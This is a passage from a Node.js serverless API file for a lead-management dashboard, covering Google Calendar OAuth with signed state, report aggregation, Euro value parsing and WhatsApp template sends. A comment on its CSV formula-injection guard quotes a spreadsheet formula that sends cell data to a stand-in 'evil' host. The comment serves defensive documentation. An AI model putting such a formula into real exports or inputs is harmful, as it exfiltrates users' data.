    if (!enc) return { token: '', calId: 'primary' };
    const refresh = _gcal.decryptToken(enc);
    if (!refresh) return { token: '', calId: 'primary' };
    const token = await _gcal.getAccessToken(refresh);
    const calId = rec.fields['fldWBxxhGYEZNIMqA'] || rec.fields['Google Calendar ID'] || 'primary';
    return { token, calId };
  } catch (e) { console.error('[gcal] access-for-project failed:', e && e.message); return { token: '', calId: 'primary' }; }
}

// ── Google Calendar OAuth handler (folded in from the former api/gcal.js) ──────
// Reached via the /api/gcal -> /api/leads?__gcal=1 rewrite (vercel.json).
// Modes (all POST, authenticated via the same signed session token every other
// dashboard request sends in x-api-key — see verifySession() above):
//   {mode:'connect'}    -> { url } the caller redirects the browser to (Google
//                          consent screen). We deliberately return the URL
//                          instead of doing a 302 ourselves: a bare GET
//                          navigation here has no way to carry the caller's
//                          x-api-key header (this app has no auth cookie), so
//                          the SPA fetches this authenticated endpoint first,
//                          then does `window.location.href = url` itself. The
//                          session token therefore never travels in any URL.
//   {mode:'status'}     -> { configured, connected, email }
//   {mode:'disconnect'} -> clears the stored refresh token + email
// Plus two GET-only steps Google itself calls, unauthenticated by us — trust
// is established purely through the signed, short-TTL `state` param:
//   ?action=callback    -> Google's redirect back after consent. Exchanges the
//                          code, encrypts + stores the refresh token, 302s back
//                          to the dashboard with a `?gcal=...` status flag.
const GCAL_STATE_TTL_MS = 10 * 60 * 1000;
const GCAL_CLIENTS_TABLE = 'tblPidTrwGRzRt4LZ';
const GCAL_F_PROJECT = 'fldN4dL0bGgfBOXwM';
const GCAL_F_REFRESH = 'fldkYmK3jAabvytCF';   // Google Refresh Token (encrypted at rest)
const GCAL_F_GEMAIL  = 'fldXF7qdyHYnSjnGf';   // Google Calendar Email
const GCAL_F_CALID   = 'fldWBxxhGYEZNIMqA';   // Google Calendar ID

function gcalSignState(projectCode) {
  const payload = Buffer.from(JSON.stringify({ p: projectCode, t: Date.now() })).toString('base64url');
  const sig = crypto.createHmac('sha256', sessionSecret()).update(payload).digest('base64url');
  return `${payload}.${sig}`;
}
function gcalVerifyState(state) {
  try {
    const [payload, sig] = String(state || '').split('.');
    if (!payload || !sig) return '';
    const expected = crypto.createHmac('sha256', sessionSecret()).update(payload).digest('base64url');
    const a = Buffer.from(sig, 'base64url'), b = Buffer.from(expected, 'base64url');
    if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return '';
    const data = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
    if (!data.p || !data.t || Date.now() - data.t > GCAL_STATE_TTL_MS) return '';
    return data.p;
  } catch { return ''; }
}
async function gcalGetClient(projectCode) {
  const BASE_ID = process.env.BASE_AIRTABLE, TOKEN = process.env.API_AIRTABLE;
  const formula = encodeURIComponent(`{${GCAL_F_PROJECT}}="${escapeFormula(projectCode)}"`);
  const r = await atFetch(`https://api.airtable.com/v0/${BASE_ID}/${GCAL_CLIENTS_TABLE}?filterByFormula=${formula}&maxRecords=1`,
    { headers: { Authorization: `Bearer ${TOKEN}` } });
  if (!r.ok) return null;
  return ((await r.json()).records || [])[0] || null;
}
async function gcalPatchClient(recordId, fields) {
  const BASE_ID = process.env.BASE_AIRTABLE, TOKEN = process.env.API_AIRTABLE;
  return atFetch(`https://api.airtable.com/v0/${BASE_ID}/${GCAL_CLIENTS_TABLE}/${recordId}`, {
    method: 'PATCH', headers: { Authorization: `Bearer ${TOKEN}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ fields, typecast: true }),
  });
}
function gcalRedirect(res, url) { res.statusCode = 302; res.setHeader('Location', url); res.end(); }

async function handleGcal(req, res) {
  if (!_gcal.isConfigured()) {
    if (req.method === 'GET') return gcalRedirect(res, '/dashboard?gcal=unconfigured');
    return res.status(200).json({ connected: false, configured: false });
  }
  const url    = new URL(req.url, 'https://app.helvaro.pro');
  const action = url.searchParams.get('action') || '';

  // Google's OAuth callback. No x-api-key here (Google doesn't send it) — the
  // caller's identity comes entirely from the signed, TTL-limited `state`
  // param we minted in mode:'connect' below (CSRF protection: an attacker
  // cannot forge a valid state without SESSION_SECRET/ADMIN_KEY).
  if (req.method === 'GET' && action === 'callback') {
    if (url.searchParams.get('error')) return gcalRedirect(res, '/dashboard?gcal=denied');
    const code = url.searchParams.get('code');
    const projectCode = gcalVerifyState(url.searchParams.get('state'));
    if (!code || !projectCode) return gcalRedirect(res, '/dashboard?gcal=invalid_state');
    try {
      const { refreshToken, email } = await _gcal.exchangeCode(code);
      if (!refreshToken) {
        // Google didn't return a refresh token (e.g. offline access wasn't
        // actually granted). Fail closed: never mark "connected" without one.
        console.error('[gcal callback] no refresh_token in response for', projectCode);
        return gcalRedirect(res, '/dashboard?gcal=error');
      }
      const client = await gcalGetClient(projectCode);
      if (!client) return gcalRedirect(res, '/dashboard?gcal=client_not_found');
      // encryptToken() throws if no encryption key is configured — caught
      // below, which fails the connection closed (never stores plaintext).
      const encrypted = _gcal.encryptToken(refreshToken);
      await gcalPatchClient(client.id, {
        [GCAL_F_REFRESH]: encrypted,
        [GCAL_F_GEMAIL]:  email || '',
        [GCAL_F_CALID]:   'primary',
      });
      return gcalRedirect(res, '/dashboard?gcal=connected');
    } catch (e) {
      console.error('[gcal callback]', e && e.message);
      return gcalRedirect(res, '/dashboard?gcal=error');
    }
  }

  if (req.method === 'POST') {
    // Authenticate via the same signed session token every other dashboard
    // request sends. Deliberately does NOT accept the legacy raw API-key path
    // (Path B in the main handler above) — a brand-new OAuth-touching feature
    // fails closed rather than extend trust to older, unsigned tokens.
    //
    // Clerk first, for the same reason the main handler has a Path 0: this
    // route is dispatched before that block runs, and a Clerk session sends
    // 'clerk-session' in x-api-key — a sentinel, not a token. verifySession
    // rejects it, so without this every Clerk tenant got a 401 on status,
    // connect and disconnect alike: the panel read "nog niet gekoppeld"
    // forever and there was no way to attach a calendar at all. With no
    // calendar attached the booking flow can never confirm a slot is free,
    // which is the one thing it must never guess at.
    let projectCode = '';
    const clerkGcal = await _clerk.verifySession(req);
    if (clerkGcal && clerkGcal.pending) {
      return res.status(403).json({ error: 'TENANT_PENDING' });
    }
    if (clerkGcal && clerkGcal.projectCode) {
      projectCode = clerkGcal.projectCode;
    } else {
      const raw = String(req.headers['x-api-key'] || '').trim().slice(0, 2048);
      const session = verifySession(raw);
      projectCode = session && session.projectCode ? session.projectCode : '';
    }
    if (!projectCode) return res.status(401).json({ error: 'Niet ingelogd' });

    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
    body = body || {};

    if (body.mode === 'connect') {
      return res.status(200).json({ url: _gcal.getAuthUrl(gcalSignState(projectCode)) });
    }
    if (body.mode === 'status') {
      try {
        const client = await gcalGetClient(projectCode);
        const f = (client && client.fields) || {};
        const connected = !!(f[GCAL_F_REFRESH] || f['Google Refresh Token']);
        const email = f[GCAL_F_GEMAIL] || f['Google Calendar Email'] || '';
        return res.status(200).json({ configured: true, connected, email });
      } catch (e) {
        console.error('[gcal status]', e && e.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }
    if (body.mode === 'disconnect') {
      try {
        const client = await gcalGetClient(projectCode);
        if (client) {
          // Eerst bij Google intrekken, dan pas lokaal wissen. Andersom zouden
          // we de token kwijt zijn die we nodig hebben om in te trekken, en
          // bleef Helvaro aan Google's kant gekoppeld staan.
          const enc = client.fields && (client.fields[GCAL_F_REFRESH] || client.fields['Google Refresh Token']);
          if (enc) {
            try {
              const plain = _gcal.decryptToken(enc);
              const rev = await _gcal.revokeToken(plain);
              if (!rev.ok) console.warn('[gcal disconnect] intrekken bij Google mislukt:', rev.error);
            } catch (e) {
              // Ontsleutelen mislukt (sleutel gewijzigd?). Niet fataal: hieronder
              // wissen we hem alsnog, en zonder token doen we niets meer.
              console.warn('[gcal disconnect] token niet te ontsleutelen:', e && e.message);
            }
          }
          await gcalPatchClient(client.id, { [GCAL_F_REFRESH]: '', [GCAL_F_GEMAIL]: '' });
        }
        return res.status(200).json({ ok: true, connected: false });
      } catch (e) {
        console.error('[gcal disconnect]', e && e.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }
    return res.status(400).json({ error: 'Onbekende mode' });
  }
  return res.status(405).json({ error: 'Method not allowed' });
}

// Merge arbitrary top-level keys into a lead's Notities JSON envelope without
// clobbering existing notes/tasks/calls/afspraak — including legacy plain-text
// notes that predate the JSON envelope. Mirrors api/whatsapp.js's
// mergeWaFailedFlag (same file-local-helper convention already used across
// this codebase for Notities merging, rather than a shared module) — see its
// doc comment for why merge-not-overwrite matters here.
// Any key in `patch` set to `undefined` is DELETED from the envelope (used to
// clear aiPaused/escalated); every other key is merged in as-is.
function mergeNotitiesPatch(raw, patch) {
  const trimmed = raw ? String(raw).trim() : '';
  let data    = { _v: 1, notes: [], tasks: [], calls: [] };
  let handled = false;
  if (trimmed.startsWith('{')) {
    try {
      const parsed = JSON.parse(trimmed);
      if (parsed && typeof parsed === 'object') { data = { ...data, ...parsed }; handled = true; }
    } catch { /* malformed JSON: fall through, preserve as legacy text below */ }
  }
  if (!handled && trimmed) {
    data.notes = [{ id: 'legacy', text: trimmed, ts: new Date().toISOString() }];
  }
  for (const [k, v] of Object.entries(patch || {})) {
    if (v === undefined) delete data[k];
    else data[k] = v;
  }
  return JSON.stringify(data);
}

// ── Reporting period boundaries (report-summary mode) ────────────────────────
// All boundaries computed in UTC epoch ms so results don't depend on the
// Vercel function's local timezone. "this_month" compares the current
// calendar month against the PRIOR calendar month (not a rolling 30 days),
// so the trend delta means what it says. "last_30_days" is a rolling window
// compared against the 30 days immediately before it. "all_time" has no
// meaningful previous period to compare against.
function reportPeriodBounds(period) {
  const now = new Date();
  if (period === 'last_30_days') {
    const DAY = 24 * 60 * 60 * 1000;
    const currentEnd    = now.getTime();
    const currentStart  = currentEnd - 30 * DAY;
    const previousEnd    = currentStart;
    const previousStart  = previousEnd - 30 * DAY;
    return { currentStart, currentEnd, previousStart, previousEnd, hasPrevious: true, label: 'Afgelopen 30 dagen' };
  }
  if (period === 'all_time') {
    return { currentStart: 0, currentEnd: now.getTime(), previousStart: 0, previousEnd: 0, hasPrevious: false, label: 'Alle tijd' };
  }
  // this_month (default). Date.UTC handles the year rollover for January
  // automatically (month -1 becomes December of the previous year).
  const y = now.getUTCFullYear(), m = now.getUTCMonth();
  const currentStart   = Date.UTC(y, m, 1);
  const currentEnd     = now.getTime();
  const previousStart  = Date.UTC(y, m - 1, 1);
  const previousEnd    = currentStart;
  return { currentStart, currentEnd, previousStart, previousEnd, hasPrevious: true, label: 'Deze maand' };
}

// True only for Airtable checkbox fields that are actually checked. Mirrors
// the GET path's bool() helper above (v === true || v === 1) since this
// aggregation reads raw Airtable records directly rather than the mapped
// `leads` array (GET-only), to distinguish "field absent" from "field is 0"
// for the averages below.
function isChecked(v) { return v === true || v === 1; }

// Aggregate honest reporting stats for one window [startMs, endMs) of raw
// Airtable lead records. Missing fields degrade to null (never a misleading
// 0) so the UI/email can render "geen data" instead of a fabricated number.
function aggregateReportPeriod(records, startMs, endMs) {
  const inWindow = records.filter(r => {
    const raw = r.fields?.['fldR0r13EU4RwrtvH'] || r.fields?.['Created At'] || r.createdTime;
    const t = new Date(raw).getTime();
    return !isNaN(t) && t >= startMs && t < endMs;
  });

  const total = inWindow.length;
  const qualifiedCount = inWindow.filter(r => isChecked(r.fields?.['fld0hAZJ5wgaXrNTn'] ?? r.fields?.['Qualified'])).length;
  const bookedCount    = inWindow.filter(r => isChecked(r.fields?.['fldyIGNetqcSEkoaK'] ?? r.fields?.['Appointment Booked'])).length;

  // Pipeline value: "Verwachte Waarde" is a free-text, client-entered
  // ESTIMATE (fldv7qOYvCN1xJfiR). Only leads where the client actually typed
  // a parseable value count toward the sum/average — an empty field is
  // excluded, never treated as €0 (that would silently deflate the average,
  // exactly the bug batch C fixed for the client-side parser this mirrors).
  const dealValues = inWindow
    .map(r => parseDealValueServer(r.fields?.['fldv7qOYvCN1xJfiR'] ?? r.fields?.['Verwachte Waarde'] ?? ''))
    .filter(v => v > 0);
  const pipelineValueTotal = dealValues.length ? Math.round(dealValues.reduce((a, b) => a + b, 0)) : null;
  const pipelineValueAvg   = dealValues.length ? Math.round(dealValues.reduce((a, b) => a + b, 0) / dealValues.length) : null;

  // Lead score: only leads the AI has actually scored (field present as a
  // number). A real score of 0 is possible ("very unqualified"), so presence
  // — not truthiness — is what determines inclusion.
  const scores = inWindow
    .map(r => r.fields?.['fldpzQgMuWJLjogiD'] ?? r.fields?.['Lead Score'])
    .filter(v => typeof v === 'number' && !isNaN(v));
  const avgLeadScore = scores.length ? Math.round((scores.reduce((a, b) => a + b, 0) / scores.length) * 10) / 10 : null;

  // Response time: only leads with a recorded, positive response time.
  const times = inWindow
    .map(r => r.fields?.['fldUJJ8oSmAMQ9wB3'] ?? r.fields?.['Response Time (sec)'])
    .filter(v => typeof v === 'number' && v > 0);
  const avgResponseTime = times.length ? Math.round((times.reduce((a, b) => a + b, 0) / times.length) * 10) / 10 : null;

  return {
    leadsReceived:      total,
    qualifiedCount,
    qualifiedRate:      total > 0 ? Math.round((qualifiedCount / total) * 1000) / 10 : null,
    appointmentsBooked: bookedCount,
    pipelineValueTotal, pipelineValueAvg, pipelineValueCount: dealValues.length,
    avgLeadScore,       avgLeadScoreCount: scores.length,
    avgResponseTime,    avgResponseTimeCount: times.length
  };
}

// Server-side mirror of dashboard.js's parseDealValue (that copy is
// client-side JS embedded in an HTML template string, so it can't be
// require()'d here — same per-file helper duplication convention this
// codebase already uses for escapeFormula/formatApptDateTime/etc). MUST stay
// behaviorally identical: batch C fixed a bug where Belgian/Dutch-formatted
// values like "€ 1.500,00" parsed as 1.5 instead of 1500. Do not change this
// logic here without changing it in dashboard.js too (grep parseDealValue).
function parseDealValueServer(v) {
  if (!v) return 0;
  let s = String(v).replace(/[€\s]/g, '');
  // '.' = thousands separator, ',' = decimal separator when a comma is
  // present ("2.750,00" = 2750). No comma → every '.' is a thousands
  // separator too ("1.500" = 1500, never 1.5) — this format never uses '.'
  // as a decimal point.
  s = s.includes(',') ? s.replace(/\.(?=.*,)/g, '').replace(',', '.') : s.replace(/\./g, '');
  return parseFloat(s) || 0;
}

// CSV/Excel formula-injection guard. Lead-supplied fields (name, notes,
// etc.) come from the public, unauthenticated lead-capture form and are
// written into CSV exports below. If a cell's leading character is =, +, -,
// @, tab or CR, Excel/Sheets can interpret it as a formula (e.g. a
// lead-supplied name of `=HYPERLINK("http://evil/"&A1,"x")` executes on
// open). Prefixing with a single quote neutralizes it while leaving the
// visible text intact. Shared by both export code paths (A2 csv-export and
// GET ?export=true).
function csvFormulaGuard(s) {
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

// Escape HTML entities for safe embedding in email HTML
function escHtml(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// ── Email helper (SMTP primary, Resend fallback via _mailer) ─────────────────
async function sendResendEmail({ subject, html, to }) {
  const recipient = to || process.env.NOTIFY_EMAIL;
  if (!recipient) { console.warn('[leads mail] geen ontvanger'); return; }
  const { sendMail } = require('./_mailer');
  await sendMail({ to: recipient, subject, html })
    .catch(err => console.error('[leads mail]', err && err.message));
}

// ── Appointment confirmation (WhatsApp) ───────────────────────────────────────
// Used by appointment-create above. cron-followup.js has its own copy of the
// reminder-side equivalents (sendWATemplate + formatApptDateTime) and
// api/whatsapp.js has its own formatApptDateTime — same per-file helper
// duplication convention already used for mergeWaFailedFlag/escapeFormula
// across this codebase, rather than a shared module.

// Normalize a raw phone string to the digits-only format the Graph API
// expects (E.164 without the leading '+'). Same rules as the test-message
// mode above (line ~800), factored out here since the dashboard's
// appointment form may not enforce a clean format the way the WhatsApp
// webhook's `message.from` always is.
function normalizePhoneForWA(raw, regio) {
  /* `regio` bepaalt wat een nul vooraan betekent. Zonder meegegeven regio blijft
     dit België, precies zoals het was -- zie api/_regio.js voor waarom dat voor
     een Britse of Emiraatse klant een nummer opleverde dat niet bestaat. */
  return _regio.naarE164(raw, regio || _regio.standaard());
}

// Human-readable appointment date/time in the given language, Brussels tz.
// calendar:'gregory' forced explicitly — some locales default
// Intl.DateTimeFormat to a non-Gregorian calendar (verified: fa-IR silently
// used the Persian/Jalali calendar without this), which would show a
// different day/month than Google Calendar/Airtable for the same appointment.
function formatApptDateTime(iso, lang) {
  const dt = new Date(iso);
  if (isNaN(dt.getTime())) return String(iso || '');
  const opts = { weekday: 'long', day: 'numeric', month: 'long', hour: '2-digit', minute: '2-digit', timeZone: 'Europe/Brussels', calendar: 'gregory' };
  return dt.toLocaleString(_lang.getLocale(lang), opts);
}

// Send an approved Meta template message (required outside the 24h
// customer-service window). `params` = the template's body variables
// {{1}}, {{2}}, ... in order. Never throws — resolves false on any failure,
// same contract as the rest of this file's WhatsApp calls.
async function sendWATemplate(to, templateName, lang, params, phoneNumberId, token) {
  const components = (params && params.length)
    ? [{ type: 'body', parameters: params.map(p => ({ type: 'text', text: String(p) })) }]
    : [];
  try {
    const r = await fetch(`https://graph.facebook.com/v19.0/${phoneNumberId}/messages`, {
      method:  'POST',
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      body:    JSON.stringify({
        messaging_product: 'whatsapp', to, type: 'template',
        template: { name: templateName, language: { code: lang }, components }
      })
    });
    const d = await r.json().catch(() => ({}));
    if (!r.ok) { console.error(`[appointment-create] template "${templateName}" naar ${to} mislukt:`, JSON.stringify(d.error || d)); return false; }
    return true;
  } catch (err) {
    console.error(`[appointment-create] template netwerk fout naar ${to}:`, err.message);
    return false;
  }
}

// Dashboard-created appointments have no guarantee the lead has messaged us
// within Meta's 24h customer-service window — unlike the AI in-chat booking
// path (api/whatsapp.js), which is mid-conversation when it books. Sending
// freeform here risks a WhatsApp policy violation / account ban (same risk
// cron-followup.js's follow-up loop already guards against), so this ALWAYS
// goes through an approved template. If none is configured, it skips rather
// than risk it — no confirmation beats a banned WhatsApp number.
//
// Template language: defaults to the client's own Language setting (nl/fr/en,
// same field the rest of the codebase respects) since WhatsApp lets one
// approved template name have multiple approved per-language variants.
// BOOKING_TEMPLATE_LANG, if set, pins every client to a single language
// regardless — useful if the owner has so far only gotten one variant
// approved in Meta Business Manager.
async function sendAppointmentConfirmation({ airtableToken, baseId, clientsTable, projectCode, phone, leadName, startTime }) {
  const TEMPLATE_NAME       = process.env.BOOKING_TEMPLATE_NAME;
  const ENV_PHONE_NUMBER_ID = process.env.PHONE_NUMBER_ID;
  const WHATSAPP_TOKEN      = process.env.WHATSAPP_TOKEN;
  if (!TEMPLATE_NAME || !WHATSAPP_TOKEN) {
    console.warn('[appointment-create] BOOKING_TEMPLATE_NAME of WhatsApp-config ontbreekt. Bevestiging overgeslagen (freeform buiten 24u-venster zou ban riskeren)');
    return;
  }
  const normalizedPhone = normalizePhoneForWA(phone);
  if (!normalizedPhone) { console.warn('[appointment-create] ongeldig telefoonnummer voor bevestiging, overgeslagen'); return; }

  // Best-effort client lookup for name + language + per-client WhatsApp
  // sender number (F_WA_PHONE_NUMBER_ID — multitenancy prep, blank on every
  // client today). A missing/failed lookup falls back to sensible defaults
  // (incl. the shared PHONE_NUMBER_ID env var below) rather than blocking
  // the confirmation.
  let clientName = '', clientLang = 'nl', clientPnid = '';
  try {
    const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
    const cRes = await fetch(
      `https://api.airtable.com/v0/${baseId}/${clientsTable}?filterByFormula=${formula}&maxRecords=1`,
      { headers: { Authorization: `Bearer ${airtableToken}` } }
    );
    if (cRes.ok) {
      const cData = await cRes.json();
      const rec = (cData.records || [])[0];
      if (rec) {
        clientName = rec.fields['fldAnB848Sr5jl6dq'] || rec.fields['Client Name'] || '';
        clientLang = _lang.normalizeLanguageCode(rec.fields['fld1iiV9XwSbgAACZ'] || rec.fields['Language']);
        clientPnid = (rec.fields[F_WA_PHONE_NUMBER_ID] || rec.fields['WhatsApp Phone Number ID'] || '').toString().trim();
      }
    }
  } catch (err) {
    console.error('[appointment-create] klant-lookup voor bevestiging mislukt (gebruikt defaults):', err.message);
  }

  const PHONE_NUMBER_ID = clientPnid || ENV_PHONE_NUMBER_ID;
  if (!PHONE_NUMBER_ID) {
    console.warn('[appointment-create] Geen WhatsApp Phone Number ID (klant noch gedeeld). Bevestiging overgeslagen');
    return;
  }

  // Resolved against Meta's actually-approved template languages (nl/fr/en
  // today) — see _lang.resolveTemplateLanguage()'s header. This is the
  // template-bound half of language support: the dashboard-created booking
  // confirmation ALWAYS goes through an approved template (see this
  // function's own header comment on why), so a client whose Language is
  // now one of the 37 new registry languages falls back to 'nl' here
  // (logged) rather than sending a template call Meta would reject.
  const templateLang = _lang.resolveTemplateLanguage(process.env.BOOKING_TEMPLATE_LANG || clientLang, clientLang).code;
  const firstName = String(leadName || '').trim().split(' ')[0] || '';
  const when = formatApptDateTime(startTime, templateLang);
  await sendWATemplate(normalizedPhone, TEMPLATE_NAME, templateLang, [firstName, when, clientName], PHONE_NUMBER_ID, WHATSAPP_TOKEN);
}

// ── Named exports (in addition to the default route handler) ───────────────
// `module.exports` above is the async handler function itself (a plain JS
// function is also a plain JS object, so attaching properties onto it is
// safe — Vercel just calls the function it required, extra properties are
// ignored). api/cron-followup.js's runTrialLifecycle() reuses these two
// exact aggregation functions for the day-7/day-11 trial emails (TRIAL-
// DESIGN.md §5: "The ROI report IS the sales pitch" — same honest-numbers
// aggregation the Resultaten panel already uses, not a second copy of the
// logic). No behaviour change to this file's own HTTP route.
module.exports.aggregateReportPeriod = aggregateReportPeriod;
module.exports.reportPeriodBounds    = reportPeriodBounds;
// getClientWaPhoneNumberId: per-client WhatsApp sender lookup (multitenancy
// prep, see its own header above). api/cron-followup.js's main follow-up
// loop reuses this EXACT cached lookup (5-min TTL, keyed by projectCode)
// instead of writing a second Airtable-call-per-lead helper — same "reuse,
// don't duplicate" reasoning as the aggregateReportPeriod export above.
module.exports.getClientWaPhoneNumberId = getClientWaPhoneNumberId;
// sendWATemplate: shared approved-template WhatsApp sender (works outside
// Meta's 24h customer-service window, unlike a freeform text send). Exported
// so api/form.js's first-contact intro + owner-notify sends can reuse this
// EXACT helper instead of writing a second implementation — same "reuse,
// don't duplicate" reasoning as the two exports above. Never throws;
// resolves false on any failure (see its own header for the full contract).
module.exports.sendWATemplate = sendWATemplate;
